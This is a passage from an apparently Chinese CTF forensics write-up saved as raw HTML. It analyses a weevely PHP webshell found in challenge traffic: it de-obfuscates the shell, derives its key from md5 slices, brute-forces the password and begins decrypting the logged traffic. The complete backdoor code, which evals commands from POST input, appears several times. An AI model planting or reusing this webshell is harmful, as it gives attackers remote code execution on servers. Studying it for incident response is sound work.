class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crkAeatkAekA_fkAkAunkAction&#x27;</span>);</span><br><span class="line"><span class="variable">$F</span>=<span class="string">&#x27;;$j++,$i++!)!!&#123;$o.=$t&#123;$i&#125;^$k&#123;$!j&#125;;!&#125;&#125;!return !$o;&#125;if (@pr!eg!!_&#x27;</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="string">&#x27;r=@b!ase65_en!code(!@x(@gzc!ompres!s($o),$k!));pri!nt!(&quot;$p$k!h$r$kf&quot;);&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$S</span>=<span class="string">&#x27;match(&quot;/$kh(.+)$!!kf/&quot;,@file!_get_!cont!ents!(&quot;php://in!put&quot;),$!&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;m)=!=2) &#123;@ob_star!t()!;@e!val!(@gz!uncompress(@x(@ba!se64!_deco!d&#x27;</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&#x27;e($m![2!]),$k)));!$o=@ob_get!_co!ntents(!);@ob_end!_clean!();$!&#x27;</span>;</span><br><span class="line"><span class="variable">$I</span>=<span class="string">&#x27;!!$k=&quot;bd377!f!17&quot;;!$kh=&quot;9d4!cd50b4843&quot;;$kf=&quot;5b!d9ce82!0!932&quot;;$p&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;!len($t);$o=!&quot;&quot;;f!o!r($i=1;!$!i&lt;$l;)&#123;for($j=0;(!$j&lt;$c!!&amp;&amp;$i&lt;$!l)&#x27;</span>;</span><br><span class="line"><span class="variable">$J</span>=str_replace(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$I</span>.<span class="variable">$b</span>.<span class="variable">$H</span>.<span class="variable">$F</span>.<span class="variable">$S</span>.<span class="variable">$s</span>.<span class="variable">$e</span>.<span class="variable">$n</span>);</span><br><span class="line"><span class="variable">$V</span>=<span class="variable">$u</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$J</span>);<span class="variable">$V</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$J</span>;  <span class="comment">//输出上面那个J</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个典型的weevely木马，在上几届铁人三项的比赛中，都出现了类似木马。</p><p>简单分析一下木马，看起来很乱，其实很简单的混淆，仔细看<code>$J=str_replace(&#39;!&#39;,&#39;&#39;,$I.$b.$H.$F.$S.$s.$e.$n);</code>这一行，其实就是把上面所有的变量中！替换为空，就可以了。这里直接运行反混淆就行,最下面加个echo $J即可</p><p>运行后如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$k</span>=<span class="string">&quot;bd377f17&quot;</span>;<span class="variable">$kh</span>=<span class="string">&quot;9d4cd50b4843&quot;</span>;<span class="variable">$kf</span>=<span class="string">&quot;5bd9ce820932&quot;</span>;<span class="variable">$p</span>=<span class="string">&quot;oOtvNy5TkuOg1fjf&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;<span class="variable">$c</span>=strlen(<span class="variable">$k</span>);<span class="variable">$l</span>=strlen(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;<span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;&#125;&#125;<span class="keyword">return</span> <span class="variable">$o</span>;&#125;<span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>,@file_get_contents(<span class="string">&quot;php://input&quot;</span>),<span class="variable">$m</span>)==<span class="number">2</span>) &#123;@ob_start();@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">2</span>]),<span class="variable">$k</span>)));<span class="variable">$o</span>=@ob_get_contents();@ob_end_clean();<span class="variable">$r</span>=@base65_encode(@x(@gzcompress(<span class="variable">$o</span>),<span class="variable">$k</span>));<span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);&#125;</span><br><span class="line">-----------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;bd377f17&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;9d4cd50b4843&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;5bd9ce820932&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;oOtvNy5TkuOg1fjf&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, @file_get_contents(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">2</span>) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">2</span>]), <span class="variable">$k</span>)));</span><br><span class="line">    <span class="variable">$o</span> = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    <span class="variable">$r</span> = @base65_encode(@x(@gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>仔细看上面这个代码和下面网上找的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//网上找到</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;7ccf8192&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;528271413977&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;f541527062a9&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;ie3xNV9ea8twe7wl&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>; <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">&#123;$kh&#125;</span>(.+)<span class="subst">&#123;$kf&#125;</span>/&quot;</span>, @file_get_contents(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)));</span><br><span class="line">    <span class="variable">$o</span> = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    <span class="variable">$r</span> = @base64_encode(@x(@gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;<span class="subst">&#123;$p&#125;</span><span class="subst">&#123;$kh&#125;</span><span class="subst">&#123;$r&#125;</span><span class="subst">&#123;$kf&#125;</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成的</span></span><br><span class="line"><span class="comment">//weevely generate 1 1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$k</span> = <span class="string">&quot;c4ca4238&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;a0b923820dcc&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;509a6f75849b&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;FTxlZajQkHqbQYY5&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;</span><br><span class="line">            <span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, @file_get_contents(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)));</span><br><span class="line">    <span class="variable">$o</span> = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    <span class="variable">$r</span> = @base64_encode(@x(@gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以仔细看，网上找到和生成的木马</p><p><img src="/images/tiesan/image-20230505154609718.png" alt="image-20230505154609718"></p><p>在这个地方为1 和base64，而服务器给的那个111.php为，2和base65，我去google了很久都没有找到weevely的base65种编码方式</p><p><img src="/images/tiesan/image-20230505154907735.png" alt="image-20230505154907735"></p><p><img src="/images/tiesan/image-20230505154931539.png" alt="image-20230505154931539"></p><p>base64有很多，这里也搜了if (@preg_match(“/$kh(.+)$kf/“, @file_get_contents(“php://input”), $m) == 1) {  为2时，也没有搜到，显然这个木马被作者给更改了。在比赛的时候浪费了很多少时间。</p><p>详细分析weevely木马参考这个大师傅的文章<code>https://xz.aliyun.com/t/11246#reply-18400</code>，这里我就不做详细分析了。</p><p>我们只需要知道几点就可以了。在木马最后会 输出$p$kh$r$kf这几个变量的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">//服务器木马111.php</span><br><span class="line">&lt;?php</span><br><span class="line">$k = &quot;bd377f17&quot;;</span><br><span class="line">$kh = &quot;9d4cd50b4843&quot;;</span><br><span class="line">$kf = &quot;5bd9ce820932&quot;;</span><br><span class="line">$p = &quot;oOtvNy5TkuOg1fjf&quot;;</span><br><span class="line">function x($t, $k)</span><br><span class="line">&#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 1; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line">if (@preg_match(&quot;/$kh(.+)$kf/&quot;, @file_get_contents(&quot;php://input&quot;), $m) == 2) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @eval(@gzuncompress(@x(@base64_decode($m[2]), $k)));</span><br><span class="line">    $o = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    $r = @base65_encode(@x(@gzcompress($o), $k));</span><br><span class="line">    print(&quot;$p$kh$r$kf&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//请求的详细包</span><br><span class="line">--4b398f30-B--</span><br><span class="line">POST /111.php HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Content-Length: 83</span><br><span class="line">Host: 192.168.12.154</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.9) Gecko/20061215 Red Hat/1.5.0.9-0.1.el4 Firefox/1.5.0.9</span><br><span class="line"></span><br><span class="line">--4b398f30-C--</span><br><span class="line">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6goLPr65AhWAlXS5IY1OHTFYFQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span><br><span class="line">--4b398f30-F--</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: PHP/5.4.16</span><br><span class="line">Content-Length: 60</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">--4b398f30-E--</span><br><span class="line">kbPze6iWSynLVEi5a0b923820dccG6hQVAIEgDhjN3RgPg==509a6f75849b</span><br><span class="line">--4b398f30-H--</span><br><span class="line">Apache-Handler: application/x-httpd-php</span><br><span class="line">Stopwatch: 1575448316609856 1233 (- - -)</span><br><span class="line">Stopwatch2: 1575448316609856 1233; combined=36, p1=12, p2=20, p3=1, p4=0, p5=2, sr=0, sw=1, l=0, gc=0</span><br><span class="line">Response-Body-Transformed: Dechunked</span><br><span class="line">Producer: ModSecurity for Apache/2.9.2 (http://www.modsecurity.org/).</span><br><span class="line">Server: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">Engine-Mode: &quot;DETECTION_ONLY&quot;</span><br><span class="line"></span><br><span class="line">--4b398f30-Z--</span><br></pre></td></tr></table></figure><p>仔细比较这两个包，可以发现，它请求和返回信息都对不上  kh和kf以及p不对应。</p><p>经过查看大师傅文章发现 其实这个weevely木马的密码为md5</p><p>原文<code>https://www.xmsec.cc/weevely3-notes/</code><img src="/images/tiesan/image-20230505194956501.png" alt="image-20230505194956501"></p><p>那么也就是说，如果没有原木马文件，如果密码是弱的那么就可以直接解密</p><p>我看先看自己生成的木马的key</p><figure class="highlight plaintext"><figcaption><span>generate 1 1.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//weevely generate 1 1.php</span><br><span class="line"></span><br><span class="line">&lt;?php $k = &quot;c4ca4238&quot;;</span><br><span class="line">$kh = &quot;a0b923820dcc&quot;;</span><br><span class="line">$kf = &quot;509a6f75849b&quot;;</span><br><span class="line">$p = &quot;FTxlZajQkHqbQYY5&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到密码为1时，k kh kf分别为这些，把1进行加密 md5为c4ca4238a0b923820dcc509a6f75849b</p><p><img src="/images/tiesan/image-20230505195338135.png" alt="image-20230505195338135"></p><p>可以仔细比对，中间12位和最后12位，也就是<code>md5(1)=$k+$kh+$kf</code></p><p>在日志中拿出几对仔细看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">--4b398f30-C--</span><br><span class="line">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6goLPr65AhWAlXS5IY1OHTFYFQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span><br><span class="line">--4b398f30-F--</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: PHP/5.4.16</span><br><span class="line">Content-Length: 60</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">--4b398f30-E--</span><br><span class="line">kbPze6iWSynLVEi5a0b923820dccG6hQVAIEgDhjN3RgPg==509a6f75849b</span><br><span class="line">--4b398f30-H--</span><br><span class="line">Apache-Handler: application/x-httpd-php</span><br><span class="line">Stopwatch: 1575448316609856 1233 (- - -)</span><br><span class="line">Stopwatch2: 1575448316609856 1233; combined=36, p1=12, p2=20, p3=1, p4=0, p5=2, sr=0, sw=1, l=0, gc=0</span><br><span class="line">Response-Body-Transformed: Dechunked</span><br><span class="line">Producer: ModSecurity for Apache/2.9.2 (http://www.modsecurity.org/).</span><br><span class="line">Server: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">Engine-Mode: &quot;DETECTION_ONLY&quot;</span><br><span class="line"></span><br><span class="line">--4b398f30-Z--</span><br><span class="line"></span><br><span class="line">--b4e7ac4b-C--</span><br><span class="line">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5xVlRB77cp4NqcyONKnd8Y509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span><br><span class="line">--b4e7ac4b-F--</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: PHP/5.4.16</span><br><span class="line">Content-Length: 88</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">--b4e7ac4b-E--</span><br><span class="line">kbPze6iWSynLVEi5a0b923820dccG6hIrHiDBomzfE8pePx77Td8JIIi16QudxfqETUyTeNsQQ==509a6f75849b</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出这个509a6f75849b为最后的，也就是kf了，a0b923820dcc为中间的了，且都是12位</p><p>结合输出$p$kh$r$kf这几个变量的值时，也就可以判断出，这个流量包的一些值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$kh = &quot;a0b923820dcc&quot;;</span><br><span class="line">$kf = &quot;509a6f75849b&quot;; </span><br><span class="line">$p = &quot;kbPze6iWSynLVEi5&quot;;</span><br></pre></td></tr></table></figure><p>此时还差一个变量k 也是最重要的变量，因为md5(1)=$k+$kh+$kf，所以如果密码不复杂的话，可以反推密码,</p><p>这里给个简单脚本爆破密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">file = open(&quot;D:\\vscodework\\ctf\\tttt\\passwords.txt&quot;,&quot;r&quot;)</span><br><span class="line">file = file.readlines()</span><br><span class="line"></span><br><span class="line">def baopomd5():</span><br><span class="line">    for i in range(len(file)):</span><br><span class="line">        t =  str(file[i]).strip()</span><br><span class="line">        md5_result = hashlib.md5(t.encode(&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">        #print(md5_result)</span><br><span class="line">        if md5_result[8:33] == &#x27;a0b923820dcc509a6f75849b&#x27;:</span><br><span class="line">            print(t)</span><br><span class="line">            print(md5_result)</span><br><span class="line">            break</span><br><span class="line">baopomd5()</span><br><span class="line">//1</span><br></pre></td></tr></table></figure><p>这样就可以获取到了木马密码了。也可以知道变量k了</p><p>当然，如果有网络的话，也可以拿着a0b923820dcc509a6f75849b这个去cmd5查一下</p><p><img src="/images/tiesan/image-20230505202525359.png" alt="image-20230505202525359"></p><p>flag PUT 1</p><h4 id="8-10"><a href="#8-10" class="headerlink" title="8-10"></a>8-10</h4><p>因为太菜了，现场中并没有做出来后面的，所以并不知到题目是什么，不过没关系，我们把所有的流量都给他解出来，这样他问什么，我们都是知道的，</p><p>查阅其他大师傅文章，<code>https://artikrh.sh/posts/weevely-backdoor-analysis.html</code>参考这篇文章，可以得出解密脚本，这里将反推出来的k p啥的写上即可，把phpinfo替换一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;c4ca4238&quot;</span>; <span class="comment">// FIRST PART: 8 first chars</span></span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;a0b923820dcc&quot;</span>; <span class="comment">// SECOND PART: 12 next chars</span></span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;509a6f75849b&quot;</span>; <span class="comment">// THIRD PART: 12 last chars</span></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;kbPze6iWSynLVEi5&quot;</span>; <span class="comment">// Random data (?)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123; <span class="comment">// XOR</span></span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; 